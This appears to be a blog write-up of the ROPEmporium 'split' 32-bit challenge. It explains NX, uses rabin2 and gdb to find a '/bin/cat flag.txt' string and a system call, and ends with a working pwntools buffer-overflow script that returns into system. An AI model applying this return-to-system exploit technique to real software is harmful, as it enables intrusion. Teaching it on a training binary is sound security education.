---
title: "ROPEmporium: split 32-bit"
date: 2021-05-24T14:38:00+02:00
---

# Writeup of split [split] on ROPEmporium

Prerequisites: Basic knowledge of assembly, disassembling tools, and having solved ret2win for 32bit

----------------------------

Let's start this time by checking the security settings of the binary with checksec.

```bash
cave@noobpwn:~/binexp/ROP-emperium/split_32$ checksec split32
[*] '/home/cave/binexp/ROP-emperium/split_32/split32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So NX is enabled, this means that we can't just put shellcode on the stack and return to it. NX is an exploit mitigation technique that marks memory regions as (N)on(X)ecutable. This means we can't just put a "/bin/sh" and jump to that, to get a shell. But again with ROP-emporium, we won't be getting a shell, instead we'll print the flag.txt file. So let's get started. This time around we'll be using the same tools as in "ret2win". If you've still not solved it, here are some hints, that doesn't give everything away:

Can't use strings on the binary? Use rabin2 -z <binary>!
Check the manpage for system, with "man system"

Remember that system uses an argument on top of the stack (x86 ftw). If we do:
payload += 0xdeadbeef
This will push 0xdeadbeef to the top of the stack. Can you use that then?

Okay let's continue now with spoilers.

We'll start by checking the strings:
```bash
cave@noobpwn:~/binexp/ROP-emperium/split_32$ rabin2 -z split32 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```
So we have a "/bin/cat flag.txt" in the data section of the program. If we run this command in the bash commandline, it will print the flag. Cool. Now if we look at the manpage for system:
```
system - execute a shell command
```
Cool. So we need to take that string and give it to system, so that this is the command run by the program. Great. Well that's not so difficult. Now let's find the system call. Open the file with gdb, and use the info function command, to see the functions in the binary.

```assembly
-pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
```
Another usefulFunction? Disassemble that.
```assembly
pwndbg> disass usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>: push   ebp
   0x0804860d <+1>: mov    ebp,esp
   0x0804860f <+3>: sub    esp,0x8
   0x08048612 <+6>: sub    esp,0xc
   0x08048615 <+9>: push   0x804870e
   0x0804861a <+14>:    call   0x80483e0 <system@plt>  <--- found you!
   0x0804861f <+19>:    add    esp,0x10
   0x08048622 <+22>:    nop
   0x08048623 <+23>:    leave  
   0x08048624 <+24>:    ret    
End of assembler dump.
```

We need to understand that the stack is a LIFO data structure. Last In First Out. The system will use the argument that is the last in. So let's look at what happens when we call the system, this is just an example, and there might be more nuances in practical use.

```
┌────────────┐
│            │
│ rand addr  │ <-- this is the top of the stack
│            │     which will be called by system
├────────────┤
│            │
│ rand addr  │
│            │
├────────────┤
│            │
│ rand addr  │
│            │
├────────────┤
│            │
│ rand addr  │
│            │
└────────────┘
```

We can use this knowledge to craft a simple payload in python!
```python
payload = A*44 #(padding)
payload += system + addr_catflag
```

The stack will then look like this, at the time when we return to system:
```
┌────────────┐
│            │ 
│ *cat flag  │ <- a pointer to the addr
│            │    that holds the cat flag cmd
├────────────┤
│            │
│ rand addr  │
│            │
├────────────┤
│            │
│ rand addr  │
│            │
└────────────┘
```
Nice! Now you should have the knowledge to craft your own payload.

**Conclusion: To call a function, like system we need to give it an argument. If no argument is provided by us, it will use the top of the stack. It's important to know, that without NX we would be able to write to the stack, and write a string like /bin/sh, and then we would get a shell. Since NX is enabled we have to use a string already present in the binary. Which we found in the beginning**


Exploit: 

```python
from pwn import *

elfPath="./split32"
context.arch="i386"

system = p32(0x0804861a) #calls system
cat_flag = p32(0x0804a030) #/bin/cat flag.txt


gdbscript= """
continue
"""

terminalSetting = ['gnome-terminal', '-e']
context.clear(terminal=terminalSetting)

io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)

point=cyclic_find(b"laaa", endian="little")

def main():
    print(io.recvuntil("> "))

    #The reason for cat_flag to be after system is that system takes a pointer to a char buffer, 
    #the pointer is located in the esp
    #We add the string, which is now the esp. Making system use it
    
    print(io.send(b"A"*point+system+cat_flag))
    io.interactive() #Interactive state
```
